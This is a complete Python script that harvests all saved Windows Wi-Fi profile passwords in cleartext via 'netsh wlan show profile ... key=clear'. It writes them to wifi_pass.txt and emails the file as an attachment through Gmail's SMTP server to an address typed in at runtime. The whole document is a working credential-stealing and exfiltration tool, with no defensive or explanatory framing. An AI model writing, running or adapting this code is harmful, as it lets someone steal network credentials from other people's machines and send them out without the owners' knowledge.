import subprocess

#ext_wifipasswd = extract wifi password, dataprof = profile data
def ext_wifipasswd():
    dataprof = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')

    profiles = [i.split(':')[1].strip() for i in dataprof if 'All User Profile' in i]
#info_prof = profile info
    for profile in profiles:
        info_prof = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode('utf-8').split( '\n')

        try:
            passwd = [i.split(':')[1].strip() for i in info_prof if 'Key Content' in i][0]
        except IndexError:
            passwd = None

        # if u dont wanna save file, u can print password on ur screen
        #print(f'Profile: {profile}\nPassword: {passwd}\n{"#" * 20}\n')

        # save file to storage
        with open(file='wifi_pass.txt', mode='a', encoding='utf-8') as file:
            file.write(f'Profile: {profile}\nPassword: {passwd}\n{"#" * 20}\n')


ext_wifipasswd()

#send file "wifi_pass.txt" to email address
import smtplib
import os

import mimetypes
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.multipart import MIMEMultipart


def send_email(addr_to, msg_subj, msg_text, files):
    addr_from = "Type your email here"   #sender email address
    password  = "password"               #password

    msg = MIMEMultipart()
    msg['From']    = addr_from
    msg['To']      = addr_to
    msg['Subject'] = msg_subj

    body = msg_text
    msg.attach(MIMEText(body, 'plain'))

    process_attachement(msg, files)

    #========configure smtp access to email===============================================
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)    #Yours email ip and port. For example: ('smtp.gmail.com', 465)
    #server.starttls(587)                               #Secure connection with tls (optional)
    #server.set_debuglevel(True)                        #optional
    server.login(addr_from, password)
    server.send_message(msg)
    server.quit()
    #==========================================================================================================================

def process_attachement(msg, files):
    for f in files:
        if os.path.isfile(f):
            attach_file(msg,f)
        elif os.path.exists(f):
            dir = os.listdir(f)
            for file in dir:
                attach_file(msg,f+"/"+file)

def attach_file(msg, filepath):
    filename = os.path.basename(filepath)
    ctype, encoding = mimetypes.guess_type(filepath)
    if ctype is None or encoding is not None:
        ctype = 'application/octet-stream'
    maintype, subtype = ctype.split('/', 1)
    if maintype == 'text':
        with open(filepath) as fp:
            file = MIMEText(fp.read(), _subtype=subtype)
            fp.close()
    elif maintype == 'image':
        with open(filepath, 'rb') as fp:
            file = MIMEImage(fp.read(), _subtype=subtype)
            fp.close()
    elif maintype == 'audio':
        with open(filepath, 'rb') as fp:
            file = MIMEAudio(fp.read(), _subtype=subtype)
            fp.close()
    else:
        with open(filepath, 'rb') as fp:
            file = MIMEBase(maintype, subtype)
            file.set_payload(fp.read())
            fp.close()
            encoders.encode_base64(file)
    file.add_header('Content-Disposition', 'attachment', filename=filename)
    msg.attach(file)


# use function send_email()
emailadress = input("Write yours email address for sending file: ")
addr_to   = emailadress                                              # You can choose one of two variants for send message
#addr_to = 'Your email'
files = ["wifi_pass.txt"]                                            # Attachment files

send_email(addr_to, "Title", "Your text", files)